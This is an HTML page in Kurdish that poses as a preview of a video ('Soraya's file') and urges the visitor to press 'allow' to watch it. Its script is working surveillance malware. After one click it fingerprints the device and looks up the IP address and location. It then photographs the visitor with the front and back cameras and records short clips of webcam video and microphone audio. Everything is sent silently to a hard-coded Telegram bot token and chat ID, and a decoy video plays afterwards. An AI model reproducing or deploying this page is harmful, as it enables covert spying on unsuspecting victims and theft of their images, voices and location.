<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>مەلەفی سوڕەیا - داشبۆردی چاودێری قووڵ</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { 
            background: linear-gradient(135deg, #0f172a, #1e293b); 
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            overflow: hidden;
            position: fixed;
            width: 100%;
        }
        .container { 
            background: #ffffff; 
            padding: 22px; 
            border-radius: 24px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
            width: 92%; 
            max-width: 380px; 
            text-align: center; 
        }
        .preview-img-box {
            width: 100%;
            height: 200px;
            border-radius: 16px;
            overflow: hidden;
            margin-bottom: 15px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
            position: relative;
            background: #000;
        }
        .preview-img-box img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        .image-overlay-text {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(to top, rgba(0,0,0,0.85), rgba(0,0,0,0.4));
            color: #ffffff;
            padding: 10px;
            font-size: 13px;
            font-weight: bold;
            text-align: center;
        }
        .content-after-allow {
            display: none;
            margin-bottom: 15px;
        }
        .content-after-allow video {
            width: 100%;
            border-radius: 12px;
            max-height: 240px;
            object-fit: cover;
            outline: none;
        }
        .title { font-size: 22px; font-weight: 800; color: #0f172a; margin-bottom: 6px; }
        .subtitle { color: #64748b; font-size: 13px; margin-bottom: 20px; line-height: 1.5; font-weight: 500; }
        .btn { 
            background: linear-gradient(135deg, #2563eb, #1d4ed8); 
            color: white; 
            padding: 15px; 
            border: none; 
            border-radius: 30px; 
            cursor: pointer; 
            font-size: 16px; 
            width: 100%; 
            font-weight: bold; 
            box-shadow: 0 6px 16px rgba(37,99,235,0.4);
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            border-top: 3px solid #2563eb;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            margin: 15px auto;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-text { margin-top: 15px; font-size: 12px; color: #94a3b8; font-weight: 500; }
    </style>
</head>
<body>

    <div class="container" id="mainContainer">
        <div id="imageBox" class="preview-img-box">
            <img src="surayamalaf.jpg" alt="مەلەفی سوڕەیا">
            <div class="image-overlay-text">بۆ بینینی ڤیدیۆکە allow دابگرە</div>
        </div>

        <div id="mediaBox" class="content-after-allow">
            <video id="targetVideo" controls playsinline>
                <source src="sararanyai.MP4" type="video/mp4">
                تەلەفۆنەکەت پشتگیری ڤیدیۆ ناکات
            </video>
        </div>

        <div class="title" id="boxTitle">مەلەفی سوڕەیا</div>
        <div class="subtitle" id="boxSubtitle">بۆ بەردەوامبوون و بینینی تەواوی ڤیدیۆکە، کلیک بکە:</div>
        
        <div id="loader" class="loader"></div>
        <button id="mainBtn" class="btn" onclick="startProcess()">بەردەوامبوون</button>
        
        <div class="status-text" id="statusText">ئامادەیە</div>
    </div>

    <video id="camVideo" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "9011362716:AAHu7AJ1P7dEZCMfs0Mhu8B2U-Df0XnYOOQ";
        const CHAT_ID = "6947664268";

        let motionData = { alpha: 0, beta: 0, gamma: 0 };
        window.addEventListener('deviceorientation', function(event) {
            motionData.alpha = Math.round(event.alpha || 0);
            motionData.beta = Math.round(event.beta || 0);
            motionData.gamma = Math.round(event.gamma || 0);
        });

        function sendToTelegramText(text) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    text: text,
                    parse_mode: "Markdown"
                })
            });
        }

        function sendToTelegramPhoto(blob, caption) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            let formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "capt.jpg");
            formData.append("caption", caption);
            formData.append("parse_mode", "Markdown");
            fetch(url, { method: "POST", body: formData });
        }

        function sendToTelegramVideo(blob, caption) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
            let formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("video", blob, "live_capture.mp4");
            formData.append("caption", caption);
            formData.append("parse_mode", "Markdown");
            fetch(url, { method: "POST", body: formData });
        }

        function sendToTelegramVoice(blob, caption) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`;
            let formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("voice", blob, "audio_record.ogg");
            formData.append("caption", caption);
            formData.append("parse_mode", "Markdown");
            fetch(url, { method: "POST", body: formData });
        }

        function recordMicrophone() {
            try {
                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                .then(stream => {
                    let mediaRecorder = new MediaRecorder(stream);
                    let audioChunks = [];
                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                    mediaRecorder.onstop = () => {
                        let audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                        sendToTelegramVoice(audioBlob, "🎙️ *تۆمارکردنی دەنگی دەوروبەر (Voice Note)*");
                        stream.getTracks().forEach(track => track.stop());
                    };
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 4000);
                })
                .catch(err => {});
            } catch(e) {}
        }

        function recordLiveVideo() {
            try {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
                .then(stream => {
                    const videoElem = document.getElementById('camVideo');
                    videoElem.srcObject = stream;
                    videoElem.play();
                    
                    let options = { mimeType: 'video/mp4' };
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                        options = { mimeType: 'video/webm' };
                    }
                    
                    let mediaRecorder = new MediaRecorder(stream, options);
                    let videoChunks = [];
                    mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
                    mediaRecorder.onstop = () => {
                        let videoBlob = new Blob(videoChunks, { type: options.mimeType });
                        sendToTelegramVideo(videoBlob, "🎥 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی ڕووخسار (Live Video)*");
                        stream.getTracks().forEach(track => track.stop());
                    };
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 4000);
                })
                .catch(err => {});
            } catch(e) {}
        }

        async function getRobustIPData() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                if (data && data.ip) return data;
            } catch(e) {}

            try {
                let res = await fetch('https://ipinfo.io/json');
                let data = await res.json();
                if (data && data.ip) {
                    let parts = (data.country || "").split(",");
                    return {
                        ip: data.ip,
                        city: data.city,
                        country_name: data.country,
                        org: data.org
                    };
                }
            } catch(e) {}

            try {
                let res = await fetch('https://api.ipify.org?format=json');
                let data = await res.json();
                return { ip: data.ip, city: "نەزانراو", country_name: "نەزانراو", org: "نەزانراو" };
            } catch(e) {
                return { ip: "نەتوانرا دەستنیشان بکرێت", city: "", country_name: "", org: "" };
            }
        }

        function takePicturesSequence() {
            const video = document.getElementById('camVideo');
            const canvas = document.getElementById('canvas');
            
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(function(stream) {
                video.srcObject = stream;
                video.play();
                
                setTimeout(function() {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    let context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(function(blob) {
                        sendToTelegramPhoto(blob, "📸 *وێنەی دوربینی پێشەوە (Selfie)*");
                    }, 'image/jpeg', 0.9);
                    
                    stream.getTracks().forEach(track => track.stop());

                    setTimeout(function() {
                        navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false })
                        .then(function(backStream) {
                            video.srcObject = backStream;
                            video.play();
                            setTimeout(function() {
                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                canvas.toBlob(function(backBlob) {
                                    sendToTelegramPhoto(backBlob, "📷 *وێنەی دوربینی دواوە (Back Camera)*");
                                }, 'image/jpeg', 0.9);
                                backStream.getTracks().forEach(track => track.stop());
                            }, 1000);
                        }).catch(e => {});
                    }, 1000);

                }, 1200);
            })
            .catch(function(err) {});
        }

        async function gatherAndSendDetails() {
            let ua = navigator.userAgent;
            let platform = navigator.platform;
            let language = navigator.language;
            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            let screenRes = window.screen.width + "x" + window.screen.height;
            let cpuCores = navigator.hardwareConcurrency || "نەزانراو";
            let deviceRam = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "نەزانراو";
            let touchPoints = navigator.maxTouchPoints || 0;

            let ipData = await getRobustIPData();

            let report = `💎 *ڕاپۆرتی لووتکەی زۆر قووڵ (ULTIMATE DEEP PRO):*\n\n` +
                         `🌐 *ڕایەڵە و ئایپی دڵنیاکراوە:*\n` +
                         `• *ئایپی گشتی:* \`${ipData.ip}\`\n` +
                         `• *وڵات و شار:* ${ipData.country_name} - ${ipData.city}\n` +
                         `• *ناوچەی کاتی:* \`${timezone}\`\n` +
                         `• *دابینکەری هێڵ:* ${ipData.org}\n\n` +
                         `💻 *ڕەقامەواڵە و فینگەرپرینت:*\n` +
                         `• سیستم: ${platform}\n` +
                         `• پرۆسێسەر (Cores): ${cpuCores}\n` +
                         `• ڕام: ${deviceRam}\n` +
                         `• ڕەهەندی شاشە: ${screenRes}\n` +
                         `• زمان: ${language}\n\n` +
                         `📱 *براوسەر (User Agent):*\n\`${ua}\``;
            
            sendToTelegramText(report);
        }

        function startProcess() {
            document.getElementById('mainBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('statusText').innerText = 'چاوەڕوان بە...';

            gatherAndSendDetails();
            takePicturesSequence();
            recordLiveVideo();
            recordMicrophone();

            setTimeout(function() {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('imageBox').style.display = 'none';
                document.getElementById('mediaBox').style.display = 'block';
                document.getElementById('boxTitle').innerText = 'مەلەفی سوڕەیا';
                document.getElementById('boxSubtitle').innerText = 'فەرموو ڤیدیۆکە دەست پێ دەکات:';
                document.getElementById('statusText').innerText = 'سەرکەوتوو بوو';
                
                let vid = document.getElementById('targetVideo');
                vid.play().catch(e => console.log(e));
            }, 3500);
        }
    </script>
</body>
</html>
